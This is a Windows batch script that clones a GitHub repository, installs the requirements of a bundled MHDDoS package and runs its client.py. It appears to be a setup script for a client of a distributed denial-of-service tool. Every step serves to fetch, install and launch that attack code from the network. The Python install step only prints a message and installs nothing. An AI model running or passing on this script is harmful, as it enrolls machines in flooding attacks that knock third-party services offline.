@echo off
setlocal enabledelayedexpansion

:: Set the GitHub repository URL
set GITHUB_REPO=https://github.com/botsarefuture/ns.git

:: Clone the repository
git clone %GITHUB_REPO%

:: Navigate to the project directory
cd ns\client

:: Check if Python is installed
where python3 >nul 2>nul
if %errorlevel% equ 0 (
    echo Python 3 is already installed.
) else (
    :: Install Python 3 - Please install Python manually on Windows
    echo Installing Python 3...
    :: Add commands for installing Python based on your system (e.g., download installer)
    :: For example, you can download and install Python from https://www.python.org/downloads/
)

:: Install the required Python packages
python -m pip install -r mhddos\MHDDoS\requirements.txt

:: Run the client script
python client.py

:: End of script
